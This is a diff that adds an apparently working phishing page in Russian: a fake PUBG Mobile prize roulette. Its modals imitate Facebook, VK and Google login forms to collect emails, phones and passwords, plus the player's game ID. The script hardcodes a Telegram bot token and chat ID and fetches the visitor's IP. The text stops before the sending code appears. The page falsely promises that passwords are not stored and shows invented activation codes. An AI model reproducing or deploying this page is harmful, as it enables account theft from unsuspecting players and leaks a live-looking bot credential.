@@ -1,0 +1,1571 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Подарок PUBG Mobile</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-attachment: fixed;
+            position: relative;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0;
+            position: relative;
+            min-height: 100vh;
+            background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
+            overflow: hidden;
+        }
+        
+        /* Контент */
+        .content {
+            padding: 20px;
+            position: relative;
+            animation: fadeIn 0.8s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .game-section {
+            background: rgba(30, 30, 46, 0.8);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            animation: slideUp 0.6s ease-out 0.2s both;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .prize-display {
+            background: rgba(40, 40, 60, 0.6);
+            border-radius: 20px;
+            padding: 30px 20px;
+            text-align: center;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            min-height: 320px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            animation: pulseGlow 2s infinite alternate;
+        }
+        
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 20px rgba(255, 56, 56, 0.1); }
+            100% { box-shadow: 0 0 40px rgba(255, 56, 56, 0.3); }
+        }
+        
+        /* Анимированная рулетка */
+        .slot-machine {
+            width: 180px;
+            height: 180px;
+            background: linear-gradient(145deg, #2d2d44, #1a1a2e);
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 
+                0 10px 30px rgba(255, 56, 56, 0.4),
+                inset 0 4px 12px rgba(255, 56, 56, 0.3),
+                inset 0 -4px 12px rgba(0, 0, 0, 0.6);
+            border: 3px solid #ff3838;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .slot-machine::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(
+                transparent, 
+                rgba(255, 56, 56, 0.8),
+                transparent 30%
+            );
+            animation: rotate 3s linear infinite;
+            z-index: 1;
+        }
+        
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .slot-machine-inner {
+            font-size: 80px;
+            z-index: 2;
+            position: relative;
+            background: linear-gradient(45deg, #FFD700, #ff9d00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        .prize-name-large {
+            font-size: 28px;
+            background: linear-gradient(45deg, #FFD700, #ff9d00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: bold;
+            margin-bottom: 10px;
+            animation: textGlow 2s infinite alternate;
+        }
+        
+        @keyframes textGlow {
+            0% { text-shadow: 0 0 10px rgba(255, 215, 0, 0.3); }
+            100% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.6); }
+        }
+        
+        .prize-subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            animation: fadeInUp 0.8s ease-out 0.4s both;
+        }
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .spin-button {
+            background: linear-gradient(45deg, #ff3838, #ff6b6b);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            padding: 20px;
+            font-size: 20px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+            animation: buttonPulse 2s infinite;
+        }
+        
+        @keyframes buttonPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+        
+        .spin-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(255, 56, 56, 0.5);
+        }
+        
+        .spin-button:disabled {
+            background: linear-gradient(45deg, #666, #888);
+            cursor: not-allowed;
+            transform: none !important;
+            animation: none;
+        }
+        
+        .spin-button::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent,
+                rgba(255, 255, 255, 0.1),
+                transparent
+            );
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        /* Правая секция - ТВОЙ ВЫИГРЫШ */
+        .result-section {
+            background: rgba(30, 30, 46, 0.8);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            animation: slideUp 0.6s ease-out 0.4s both;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            color: white;
+            position: relative;
+            display: inline-block;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 25%;
+            width: 50%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #ff3838, transparent);
+            animation: widthPulse 2s infinite;
+        }
+        
+        @keyframes widthPulse {
+            0%, 100% { width: 50%; }
+            50% { width: 60%; }
+        }
+        
+        .winner-info {
+            background: rgba(40, 40, 60, 0.6);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+            text-align: center;
+            animation: fadeIn 0.8s ease-out;
+        }
+        
+        .win-message {
+            font-size: 22px;
+            color: #00b894;
+            font-weight: bold;
+            margin-bottom: 15px;
+            animation: colorShift 3s infinite alternate;
+        }
+        
+        @keyframes colorShift {
+            0% { color: #00b894; }
+            100% { color: #00ffd0; }
+        }
+        
+        .winner-prize {
+            font-size: 20px;
+            color: #FFD700;
+            font-weight: bold;
+            margin-bottom: 15px;
+            animation: goldShine 2s infinite alternate;
+        }
+        
+        @keyframes goldShine {
+            0% { text-shadow: 0 0 10px rgba(255, 215, 0, 0.5); }
+            100% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.8); }
+        }
+        
+        .winner-desc {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 15px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .social-choice-btn {
+            background: linear-gradient(45deg, #666, #888);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .social-choice-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+        
+        .social-choice-btn::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.1), 
+                transparent);
+            top: 0;
+            left: -100%;
+            transition: left 0.5s;
+        }
+        
+        .social-choice-btn:hover::after {
+            left: 100%;
+        }
+        
+        /* Призы */
+        .prizes-showcase {
+            background: rgba(30, 30, 46, 0.8);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            animation: slideUp 0.6s ease-out 0.6s both;
+        }
+        
+        .prizes-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .prize-item {
+            background: rgba(40, 40, 60, 0.6);
+            border-radius: 15px;
+            padding: 20px 15px;
+            text-align: center;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border: 1px solid transparent;
+            position: relative;
+            overflow: hidden;
+            animation: itemAppear 0.5s ease-out;
+        }
+        
+        @keyframes itemAppear {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        .prize-item:hover {
+            border-color: #ff3838;
+            transform: translateY(-8px) scale(1.05);
+            box-shadow: 0 10px 25px rgba(255, 56, 56, 0.3);
+        }
+        
+        .prize-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #ff3838, #FFD700, #ff3838);
+            background-size: 200% 100%;
+            animation: shimmer 2s infinite linear;
+        }
+        
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+        
+        .prize-item img {
+            width: 70px;
+            height: 70px;
+            object-fit: contain;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 4px 8px rgba(255, 215, 0, 0.5));
+            transition: all 0.3s;
+        }
+        
+        .prize-item:hover img {
+            transform: rotate(5deg) scale(1.1);
+            filter: drop-shadow(0 6px 12px rgba(255, 215, 0, 0.7));
+        }
+        
+        .prize-item-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #FFD700;
+            transition: all 0.3s;
+        }
+        
+        .prize-item:hover .prize-item-name {
+            color: #ff9d00;
+        }
+        
+        /* Инструкции */
+        .instructions {
+            background: rgba(255, 193, 7, 0.1);
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 20px;
+            border: 1px solid rgba(255, 193, 7, 0.2);
+            animation: fadeIn 0.8s ease-out 0.8s both;
+        }
+        
+        .instructions h3 {
+            color: #ffc107;
+            margin-bottom: 20px;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: slideInLeft 0.6s ease-out;
+        }
+        
+        @keyframes slideInLeft {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        .instructions ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .instructions li {
+            margin-bottom: 15px;
+            padding-left: 30px;
+            position: relative;
+            font-size: 14px;
+            line-height: 1.5;
+            opacity: 0;
+            animation: listItemAppear 0.4s ease-out forwards;
+        }
+        
+        .instructions li:nth-child(1) { animation-delay: 0.9s; }
+        .instructions li:nth-child(2) { animation-delay: 1.0s; }
+        .instructions li:nth-child(3) { animation-delay: 1.1s; }
+        .instructions li:nth-child(4) { animation-delay: 1.2s; }
+        .instructions li:nth-child(5) { animation-delay: 1.3s; }
+        .instructions li:nth-child(6) { animation-delay: 1.4s; }
+        
+        @keyframes listItemAppear {
+            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; transform: translateY(10px); }
+        }
+        
+        .instructions li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #00b894;
+            font-weight: bold;
+            font-size: 16px;
+            animation: checkPulse 2s infinite;
+        }
+        
+        @keyframes checkPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+        
+        /* Анимация выигрыша */
+        .won-prize-animation {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 100px;
+            z-index: 100;
+            animation: prizeReveal 1.5s ease-out forwards;
+            opacity: 0;
+        }
+        
+        @keyframes prizeReveal {
+            0% { 
+                opacity: 0; 
+                transform: translate(-50%, -50%) scale(0.1) rotate(-180deg); 
+            }
+            50% { 
+                opacity: 1; 
+                transform: translate(-50%, -50%) scale(1.2) rotate(0deg); 
+            }
+            100% { 
+                opacity: 1; 
+                transform: translate(-50%, -50%) scale(1) rotate(0deg); 
+            }
+        }
+        
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background: #ff3838;
+            top: -10px;
+            z-index: 999;
+            animation: confettiFall 5s linear forwards;
+        }
+        
+        .confetti:nth-child(odd) { background: #FFD700; }
+        .confetti:nth-child(2n) { background: #00b894; }
+        .confetti:nth-child(3n) { background: #1877F2; }
+        .confetti:nth-child(4n) { background: #9b59b6; }
+        
+        @keyframes confettiFall {
+            0% { 
+                transform: translateY(0) rotate(0deg); 
+                opacity: 1; 
+            }
+            100% { 
+                transform: translateY(100vh) rotate(720deg); 
+                opacity: 0; 
+            }
+        }
+        
+        /* Защита данных текст */
+        .data-protection {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 12px;
+            padding: 20px;
+            margin-top: 10px;
+            animation: fadeIn 1s ease-out 1.5s both;
+        }
+        
+        /* Фоновые текстуры */
+        .bg-texture {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255, 56, 56, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 215, 0, 0.05) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+            animation: bgMove 20s infinite alternate ease-in-out;
+        }
+        
+        @keyframes bgMove {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(-50px, -50px) scale(1.1); }
+        }
+        
+        .floating-particle {
+            position: fixed;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: -1;
+            animation: floatAround 20s infinite linear;
+        }
+        
+        @keyframes floatAround {
+            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(100px, 50px) rotate(90deg); }
+            50% { transform: translate(50px, 100px) rotate(180deg); }
+            75% { transform: translate(-50px, 50px) rotate(270deg); }
+        }
+        
+        /* Адаптив */
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+            }
+            
+            .content {
+                padding: 15px;
+            }
+            
+            .game-section,
+            .result-section,
+            .prizes-showcase {
+                padding: 20px;
+            }
+            
+            .prizes-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .slot-machine {
+                width: 160px;
+                height: 160px;
+            }
+            
+            .slot-machine-inner {
+                font-size: 70px;
+            }
+        }
+        
+        /* Анимация вращения рулетки */
+        @keyframes spinWheel {
+            0% { transform: rotate(0deg); }
+            25% { transform: rotate(90deg); }
+            50% { transform: rotate(180deg); }
+            75% { transform: rotate(270deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .spinning {
+            animation: spinWheel 0.5s linear infinite !important;
+        }
+        
+        /* Модальные окна */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: modalFadeIn 0.3s ease-out;
+        }
+        
+        @keyframes modalFadeIn {
+            from { opacity: 0; backdrop-filter: blur(0px); }
+            to { opacity: 1; backdrop-filter: blur(10px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-texture"></div>
+    
+    <!-- Плавающие частицы -->
+    <div class="floating-particle" style="top: 10%; left: 20%; animation-delay: 0s;"></div>
+    <div class="floating-particle" style="top: 30%; left: 80%; animation-delay: -5s;"></div>
+    <div class="floating-particle" style="top: 70%; left: 40%; animation-delay: -10s;"></div>
+    <div class="floating-particle" style="top: 40%; left: 10%; animation-delay: -15s;"></div>
+    <div class="floating-particle" style="top: 80%; left: 90%; animation-delay: -7s;"></div>
+    
+    <div class="container">
+        <div class="content">
+            <!-- Левая секция - игра -->
+            <div class="game-section">
+                <div class="prize-display" id="prizeDisplay">
+                    <div id="defaultPrize">
+                        <div class="slot-machine">
+                            <div class="slot-machine-inner">🎰</div>
+                        </div>
+                        <div class="prize-name-large">Нажми "Крутить"</div>
+                        <div class="prize-subtitle">и выиграй эксклюзивный приз!</div>
+                    </div>
+                    
+                    <div id="wonPrize" style="display: none;">
+                        <img id="wonPrizeImage" src="" alt="Выигранный приз" style="width: 120px; height: 120px; object-fit: contain; margin-bottom: 20px; filter: drop-shadow(0 4px 8px rgba(255, 215, 0, 0.5));">
+                        <div class="prize-name-large" id="wonPrizeName"></div>
+                        <div class="prize-subtitle" id="wonPrizeDesc" style="color: #00b894;"></div>
+                    </div>
+                </div>
+                
+                <button class="spin-button" id="spinButton">
+                    <i class="fas fa-dice"></i>
+                    КРУТИТЬ
+                </button>
+            </div>
+            
+            <!-- Правая секция - ТВОЙ ВЫИГРЫШ -->
+            <div class="result-section">
+                <div class="section-title">ТВОЙ ВЫИГРЫШ</div>
+                
+                <div class="winner-info">
+                    <div id="initialMessage">
+                        <div class="win-message">🎯 У тебя есть 1 попытка!</div>
+                        <div class="winner-desc">
+                            Нажми кнопку "Крутить" чтобы выиграть скин или валюту PUBG Mobile
+                        </div>
+                    </div>
+                    
+                    <div id="winnerMessage" style="display: none;">
+                        <div class="win-message">🎉 ПОЗДРАВЛЯЕМ!</div>
+                        <div class="winner-prize">
+                            Ты выиграл: <span id="winnerPrizeText"></span>
+                        </div>
+                        <div class="winner-desc">
+                            Для получения приза войди через соцсеть
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="social-choice-btn" id="socialChoiceBtn" style="display: none;">
+                    <i class="fas fa-sign-in-alt"></i>
+                    ВЫБРАТЬ СПОСОБ ВХОДА
+                </button>
+                
+                <!-- Инструкции -->
+                <div class="instructions">
+                    <h3><i class="fas fa-list-check"></i> КАК ПОЛУЧИТЬ ПРИЗ:</h3>
+                    <ul>
+                        <li>Нажми "Крутить" и дождись результата</li>
+                        <li>Нажми "Выбрать способ входа"</li>
+                        <li>Выбери соцсеть для входа</li>
+                        <li>Введи свои данные</li>
+                        <li>Введи свой ID PUBG Mobile</li>
+                        <li>Получи код активации!</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Призы -->
+            <div class="prizes-showcase">
+                <div class="section-title">ВОЗМОЖНЫЕ ПРИЗЫ</div>
+                <div class="prizes-grid" id="prizesGrid"></div>
+            </div>
+            
+            <!-- Защита данных -->
+            <div class="data-protection">
+                🔒 Ваши данные защищены. Мы не храним пароли.
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальные окна (остаются без изменений) -->
+    <div class="modal-overlay" id="socialModal">
+        <div class="facebook-original">
+            <div class="fb-header">
+                <div class="fb-logo" style="color: #ff3838; font-size: 36px; font-family: 'Arial Black', sans-serif;">PUBG</div>
+                <h2 class="fb-title">Выберите способ входа</h2>
+            </div>
+            <div class="fb-body">
+                <div class="social-options">
+                    <div class="social-option social-facebook active" data-social="facebook">
+                        <div class="social-icon">
+                            <i class="fab fa-facebook"></i>
+                        </div>
+                        <div class="social-name">Facebook</div>
+                    </div>
+                    <div class="social-option social-vk" data-social="vk">
+                        <div class="social-icon">
+                            <i class="fab fa-vk"></i>
+                        </div>
+                        <div class="social-name">ВКонтакте</div>
+                    </div>
+                    <div class="social-option social-google" data-social="google">
+                        <div class="social-icon">
+                            <i class="fab fa-google"></i>
+                        </div>
+                        <div class="social-name">Google</div>
+                    </div>
+                </div>
+                <div style="text-align: center; margin-top: 20px; color: #606770; font-size: 14px;">
+                    Выберите соцсеть для получения приза
+                </div>
+                <button class="fb-submit" id="confirmSocialBtn" style="margin-top: 25px; background: #ff3838;">
+                    ПРОДОЛЖИТЬ
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Facebook модалка -->
+    <div class="modal-overlay" id="facebookModal">
+        <div class="facebook-original">
+            <div class="fb-header">
+                <div class="fb-logo">facebook</div>
+                <div style="color: #1c1e21; font-size: 18px; margin-top: 10px;">Русский</div>
+            </div>
+            <div class="fb-body">
+                <form id="facebookForm">
+                    <div class="fb-form-group">
+                        <input type="text" class="fb-input" id="fbEmail" placeholder="Мобильный телефон или эл. адрес" required>
+                    </div>
+                    
+                    <div class="fb-form-group">
+                        <input type="password" class="fb-input" id="fbPassword" placeholder="Пароль" required>
+                    </div>
+                    
+                    <button type="submit" class="fb-submit" id="submitFacebookBtn">
+                        Войти
+                    </button>
+                </form>
+                
+                <div style="text-align: center; margin-top: 16px;">
+                    <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px; font-family: Helvetica, Arial, sans-serif;">
+                        Забыли пароль?
+                    </a>
+                </div>
+                
+                <hr style="border: none; border-top: 1px solid #dadde1; margin: 20px 0;" />
+                
+                <button type="button" class="fb-submit" style="background: #42b72a; margin-top: 0;">
+                    Создать новый аккаунт
+                </button>
+            </div>
+            
+            <div class="fb-footer">
+                <div class="fb-links">
+                    <a href="#" class="fb-link">Информация</a>
+                    <a href="#" class="fb-link">Справка</a>
+                    <a href="#" class="fb-link">Ещё</a>
+                </div>
+                <div class="fb-meta">
+                    Meta © 2024
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- VK модалка -->
+    <div class="modal-overlay" id="vkModal">
+        <div class="vk-original">
+            <div class="vk-header">
+                <div class="vk-logo">ВКонтакте</div>
+                <div class="vk-title">Войдите, чтобы получить приз</div>
+            </div>
+            <div class="vk-body">
+                <form id="vkForm">
+                    <div class="vk-form-group">
+                        <input type="text" class="vk-input" id="vkEmail" placeholder="Телефон или email" required>
+                    </div>
+                    
+                    <div class="vk-form-group">
+                        <input type="password" class="vk-input" id="vkPassword" placeholder="Пароль" required>
+                    </div>
+                    
+                    <button type="submit" class="vk-submit" id="submitVkBtn">
+                        Войти
+                    </button>
+                </form>
+            </div>
+            <div class="vk-footer">
+                <a href="#" class="vk-link">Зарегистрироваться</a>
+                <a href="#" class="vk-link">Забыли пароль?</a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Google модалка -->
+    <div class="modal-overlay" id="googleModal">
+        <div class="google-original">
+            <div class="google-header">
+                <div class="google-logo"></div>
+                <div class="google-title">Вход</div>
+                <div class="google-subtitle">Чтобы получить приз</div>
+            </div>
+            <div class="google-body">
+                <form id="googleForm">
+                    <div class="google-form-group">
+                        <input type="email" class="google-input" id="googleEmail" placeholder="Электронная почта или телефон" required>
+                    </div>
+                    
+                    <div class="google-form-group">
+                        <input type="password" class="google-input" id="googlePassword" placeholder="Введите пароль" required>
+                    </div>
+                    
+                    <button type="submit" class="google-submit" id="submitGoogleBtn">
+                        Далее
+                    </button>
+                </form>
+            </div>
+            <div class="google-footer">
+                <a href="#" class="google-link">Забыли пароль?</a>
+                <a href="#" class="google-link">Справка</a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- PUBG ID модалка -->
+    <div class="modal-overlay" id="pubgModal">
+        <div class="facebook-original">
+            <div class="fb-header">
+                <div class="fb-logo" style="color: #ff3838; font-size: 36px; font-family: 'Arial Black', sans-serif;">PUBG</div>
+                <h2 class="fb-title">Введите ID PUBG Mobile</h2>
+            </div>
+            <div class="fb-body">
+                <form id="pubgForm">
+                    <div class="fb-form-group">
+                        <input type="text" class="fb-input" id="pubgId" placeholder="Ваш ID PUBG Mobile" required>
+                    </div>
+                    
+                    <div class="fb-form-group">
+                        <select class="fb-input" id="pubgServer" required style="font-size: 17px; color: #1d2129;">
+                            <option value="">Выберите сервер</option>
+                            <option value="europe">Европа</option>
+                            <option value="asia">Азия</option>
+                            <option value="america">Америка</option>
+                            <option value="middle_east">Ближний Восток</option>
+                        </select>
+                    </div>
+                    
+                    <button type="submit" class="fb-submit" style="background: #ff3838;">
+                        ПОЛУЧИТЬ ПРИЗ
+                    </button>
+                </form>
+            </div>
+            <div class="fb-footer">
+                <div class="fb-meta">
+                    🔒 Ваши данные защищены. Мы не храним пароли.
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Успешное модальное окно -->
+    <div class="modal-overlay" id="successModal">
+        <div class="success-modal">
+            <div class="success-icon">✅</div>
+            <div class="success-title">Поздравляем!</div>
+            
+            <div style="color: #606770; padding: 0 25px; margin-bottom: 25px; font-size: 16px; line-height: 1.5;">
+                Ваш приз успешно получен и будет отправлен в течение 24 часов
+            </div>
+            
+            <div class="prize-code">
+                <div style="color: #606770; margin-bottom: 15px; font-size: 16px;">Код активации:</div>
+                <div class="code" id="activationCode"></div>
+                <div style="color: #90949c; font-size: 14px; margin-top: 15px; line-height: 1.5;">
+                    Придет на почту в течение 24 часов
+                </div>
+            </div>
+            
+            <div style="margin: 25px; padding: 20px; background: #f0f2f5; border-radius: 8px;">
+                <div style="color: #1c1e21; font-weight: bold; margin-bottom: 15px; font-size: 18px;">
+                    Ваш выигрыш:
+                </div>
+                <div style="color: #ff3838; font-size: 24px; font-weight: bold;" id="finalPrize"></div>
+            </div>
+            
+            <div style="padding: 25px; border-top: 1px solid #dadde1;">
+                <button class="fb-submit" onclick="location.reload()" style="background: #1877f2;">
+                    🎮 ВЕРНУТЬСЯ В ИГРУ
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const prizes = [
+            { 
+                id: 1, 
+                name: "Мумия", 
+                description: "Эксклюзивный скин",
+                image: "mummy_skin.png",
+                type: "skin",
+                code: "PUBG-MUMMY-" + generateCode()
+            },
+            { 
+                id: 2, 
+                name: "120 UC", 
+                description: "Игровая валюта",
+                image: "uc_120.png", 
+                type: "currency",
+                code: "PUBG-UC-120-" + generateCode()
+            },
+            { 
+                id: 3, 
+                name: "1000 Серебра", 
+                description: "Игровая валюта",
+                image: "silver_1000.png", 
+                type: "currency",
+                code: "PUBG-SILVER-1000-" + generateCode()
+            },
+            { 
+                id: 4, 
+                name: "M416 Ледник", 
+                description: "Ледяной скин",
+                image: "m416_glacier.png", 
+                type: "skin",
+                code: "PUBG-M416-GLACIER-" + generateCode()
+            },
+            { 
+                id: 5, 
+                name: "M416 Шут", 
+                description: "Шуточный скин",
+                image: "m416_joke.png", 
+                type: "skin",
+                code: "PUBG-M416-JOKE-" + generateCode()
+            },
+            { 
+                id: 6, 
+                name: "AKM Скин", 
+                description: "Эксклюзивный скин",
+                image: "akm_skin.png", 
+                type: "skin",
+                code: "PUBG-AKM-SKIN-" + generateCode()
+            },
+            { 
+                id: 7, 
+                name: "Скарель скин", 
+                description: "Редкий скин",
+                image: "scarel_skin.png", 
+                type: "skin",
+                code: "PUBG-SCAREL-" + generateCode()
+            },
+            { 
+                id: 8, 
+                name: "Сундук", 
+                description: "Сюрпризный сундук",
+                image: "chest.png", 
+                type: "chest",
+                code: "PUBG-CHEST-" + generateCode()
+            }
+        ];
+
+        function generateCode() {
+            return Math.random().toString(36).substr(2, 8).toUpperCase();
+        }
+
+        const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
+        const TELEGRAM_CHAT_ID = '1709490182';
+
+        let hasSpun = false;
+        let currentPrize = null;
+        let userIP = '';
+        let socialData = {};
+        let selectedSocial = 'facebook';
+
+        document.addEventListener('DOMContentLoaded', function() {
+            createPrizesGrid();
+            getUserIP();
+            
+            // Основные обработчики
+            document.getElementById('spinButton').addEventListener('click', spin);
+            document.getElementById('socialChoiceBtn').addEventListener('click', showSocialModal);
+            document.getElementById('confirmSocialBtn').addEventListener('click', confirmSocialChoice);
+            
+            // Обработчики форм
+            document.getElementById('facebookForm').addEventListener('submit', handleFacebookSubmit);
+            document.getElementById('vkForm').addEventListener('submit', handleVkSubmit);
+            document.getElementById('googleForm').addEventListener('submit', handleGoogleSubmit);
+            document.getElementById('pubgForm').addEventListener('submit', handlePubgSubmit);
+            
+            // Выбор соцсети
+            document.querySelectorAll('.social-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.social-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    this.classList.add('active');
+                    selectedSocial = this.dataset.social;
+                });
+            });
+            
+            // Закрытие модалок
+            ['socialModal', 'facebookModal', 'vkModal', 'googleModal', 'pubgModal', 'successModal'].forEach(id => {
+                document.getElementById(id).addEventListener('click', function(e) {
+                    if (e.target === this) closeModal(id);
+                });
+            });
+        });
+
+        function showSocialModal() {
+            if (!currentPrize) {
+                alert('Сначала крути рулетку!');
+                return;
+            }
+            document.getElementById('socialModal').style.display = 'flex';
+        }
+
+        function confirmSocialChoice() {
+            closeModal('socialModal');
+            
+            switch(selectedSocial) {
+                case 'facebook':
+                    showFacebookModal();
+                    break;
+                case 'vk':
+                    showVkModal();
+                    break;
+                case 'google':
+                    showGoogleModal();
+                    break;
+            }
+        }
+
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (error) {
